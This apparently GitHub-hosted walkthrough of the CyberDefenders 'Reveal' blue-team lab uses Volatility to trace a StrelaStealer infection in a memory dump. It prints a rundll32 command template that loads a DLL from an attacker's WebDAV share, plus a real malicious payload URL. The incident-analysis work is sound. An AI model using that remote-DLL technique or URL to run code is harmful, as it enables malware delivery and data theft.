<img width="2165" height="43" alt="image" src="https://github.com/user-attachments/assets/a2b76c09-bc49-42dc-8dc2-26546762b907" /># 🔍 CyberDefenders – Reveal Lab: Full Walkthrough

[Link Lab](https://cyberdefenders.org/blueteam-ctf-challenges/reveal/)
##  Initial Analysis

---

## Q1 — Name of the Malicious Process

**Answer: `powershell.exe


First, I enumerated the running processes to identify any suspicious activity:


```bash
python3 vol.py -f ~/192-Reveal.dmp windows.malware.malfind.Malfind
```

<img width="2197" height="302" alt="image" src="https://github.com/user-attachments/assets/f18dee49-b4ba-4be0-8cc0-534527e052db" />
<img width="1992" height="316" alt="image" src="https://github.com/user-attachments/assets/48c2c137-9d22-471c-a404-6ff2d74b71cb" />
<img width="1787" height="379" alt="image" src="https://github.com/user-attachments/assets/cf2eb588-ce9d-4ccb-b223-96d68cd37071" />


From the output, I identified three potentially malicious processes:  
`thunderbird.exe`, `smartscreen.exe`, and `powershell.exe`

To further investigate, I examined their command-line arguments:

```bash
# Confirm with cmdline to see arguments
python3 vol.py -f reveal.dmp windows.cmdline.CmdLine
```
<img width="2165" height="43" alt="image" src="https://github.com/user-attachments/assets/d917c974-3b92-4558-b4a6-99d10aa4801f" />


Upon analysis, I observed that the `powershell.exe` process was loading a DLL from a remote server w. This behavior is highly suspicious and indicative of possible malicious activity, such as fileless malware execution or remote code injection.

---

## Q2 — Parent PID of the Malicious Process

**Answer: `4120`

From `windows.pstree`, identify the PPID of `powershell.exe`. 

<img width="2529" height="91" alt="image" src="https://github.com/user-attachments/assets/d2630f84-fef4-4bb3-8420-84bf22ee86ff" />

```bash
python3 vol.py -f reveal.dmp windows.pstree | grep -A2 powershell
```

Note the **PPID column** for the malicious `powershell.exe` instance.

---

## Q3 — File Name for Second-Stage Payload

**Answer: `3435.dll`**

To identify the malicious payload, I analyzed the command-line arguments of the suspicious process:

<img width="2529" height="91" alt="image" src="https://github.com/user-attachments/assets/2ebcdc87-831a-4260-9ac2-db0465a5af04" />


From the output, it is evident that the process loads `3435.dll` from a remote location:  
`http://45.9.74.32:8888/davwwwroot/`

The `davwwwroot` directory is commonly associated with WebDAV shares and is frequently abused in **Living-off-the-Land (LotL)** attacks. This technique allows attackers to host malicious DLLs remotely and execute them without writing files directly to disk, thereby evading traditional detection mechanisms.

---
## Q4 - Identifying the shared directory on the remote server
**Answer:** `davwwwroot`

To determine the shared directory accessed by the attacker, I analyzed the command-line arguments of the malicious process. The output shows a remote path:

`http://45.9.74.32:8888/davwwwroot/`

The directory `davwwwroot` is a WebDAV share commonly abused in Living-off-the-Land attacks to host malicious payloads remotely.

---

## Q5 — MITRE ATT&CK Sub-Technique ID

**Answer: `T1218.011`**

This is the key MITRE mapping:

| Detail        | Value                         |
| ------------- | ----------------------------- |
| Technique     | System Binary Proxy Execution |
| Sub-technique | Rundll32                      |
| ID            | **T1218.011**                 |

The command line will show `rundll32.exe` being used to execute `3435.dll` from the WebDAV share:


```cmd
rundll32.exe \\<attacker-IP>\davwwwroot\3435.dll,<export>
```

`rundll32` is a signed Windows binary — using it to load a remote DLL is a **Defense Evasion** technique that bypasses many controls. This maps exactly to **T1218.011 – System Binary Proxy Execution: Rundll32**.


---

## Q6 — Username the Malicious Process Runs Under

**Answer: `elon`**

Use the `getsids` plugin on the malicious process PID:


```bash
# First get the PID of powershell.exe
python3 vol.py -f reveal.dmp windows.pslist | grep powershell

# Then get SIDs for that PID
python3 vol.py -f ~/192-Reveal.dmp  windows.getsids.GetSIDs
```

<img width="1438" height="428" alt="image" src="https://github.com/user-attachments/assets/fb6a0cec-9aa8-4c93-ab03-9558bd9afd8d" />

The output will show the SID resolving to a local username — in this case `elon`. This tells you which account was compromised.

---

## Q7 — Malware Family Name

## ## Q7 — Malware Family Name

**Answer:** `StrelaStealer`

To identify the malware family, I correlated indicators extracted from the memory dump with open-source threat intelligence platforms.

First, I identified suspicious network activity:

`python3 vol.py -f reveal.dmp windows.netstat.NetStat`

This revealed a connection to a suspicious external IP address (`45.9.74.32`). I then cross-referenced this IP on platforms such as VirusTotal.

The results associated this infrastructure with **StrelaStealer**, a known information-stealing malware family.

Additionally, earlier findings support this conclusion:

- PowerShell downloading a DLL from a remote WebDAV path (`davwwwroot`)
- Execution of a suspicious DLL (`3435.dll`)
- Use of Living-off-the-Land techniques for stealthy payload delivery

These behaviors are consistent with known **StrelaStealer** infection chains, which often rely on remote payload retrieval and fileless execution techniques.

## 🗺️ Full Attack Chain Summary

```cs
User executes malicious payload
        ↓
powershell.exe (elevated privileges)
        ↓
Downloads 3435.dll from remote WebDAV share
  http://45.9.74.32:8888/davwwwroot/
        ↓
DLL executed in memory (possible injection)
        ↓
Connection established to attacker-controlled IP
        ↓
StrelaStealer performs data exfiltration
